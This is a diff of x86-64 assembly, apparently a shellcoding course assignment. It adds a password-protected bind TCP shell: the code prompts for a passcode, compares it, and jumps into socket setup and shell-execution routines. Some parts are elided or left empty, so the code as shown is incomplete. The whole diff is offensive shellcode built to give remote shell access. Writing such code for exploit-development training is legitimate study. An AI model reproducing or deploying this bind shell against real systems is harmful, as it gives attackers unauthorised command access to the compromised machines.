@@ -1,6 +1,58 @@
 global _start
 
+section .text
 _start:
+        jmp call_main
+
+exit_gracefully:
+        ;exit syscall
+        xor rax, rax 
+        add rax, 60
+        xor rdi, rdi 
+        syscall
+
+password_ok:
+        ;write to console
+        xor rax, rax
+        mov al, 1
+        mov rdi, rax
+        mov rsi, exec_print
+        mov rdx, lenexec
+        syscall
+        jmp bind_tcp_shell
+
+validate_and_jump:
+        pop rsi
+
+        ;write to console
+        xor rax, rax
+        mov al, 1
+        mov rdi, rax
+        mov rdx, rdi
+        add rdx, 32
+        syscall
+
+        ;read from stdin
+        xor rax, rax
+        mov al, 0; syscall num for read
+        mov rdi, 0; fd for stdin
+        mov rsi, readbuf
+        mov rdx, 4
+        syscall
+
+        ;jump if password matches
+	cld
+        lea rax, [readbuf]
+        lea rdi, [passcode]
+        cmpsq
+        jz password_ok
+
+dup_console:
+	
+
+	jmp execute_shell
+
+bind_tcp_shell:
 	xor rax, rax
 	xor rdi, rdi
 	xor rsi, rsi
@@ -40,19 +92,20 @@ _start:
 	xor rdx, rdx
 	syscall
 
-	mov rbx, rax ; store client fd in rbx
+	push rax
+	;mov rbx, rax ; store client fd in rbx
+
+	jmp dup_console
+
 	
-	;send pass prompt to client
-
-	;recv from client the passphrase
-
-	;compare passphrase with password
-
-	;fork to child - detach main
-
-	;Execute /bin/sh in child
-
+call_main:
+        call validate_and_jump
+        password: db 'Enter Passcode to Exec Shellcode', 0xa
 
 section .data:
-	enter_password: db 'Enter the PassPhrase for Shell Server', 0xa
-	password: db 'slae64assign1'
+	readbuf: times 64 dq 0
+        ;lenbuf: equ $-readbuf
+        passcode: dq '1234', 0xa
+        exec_print: dq 'Executing ShellCode', 0xa
+        lenexec: equ $-exec_print
+
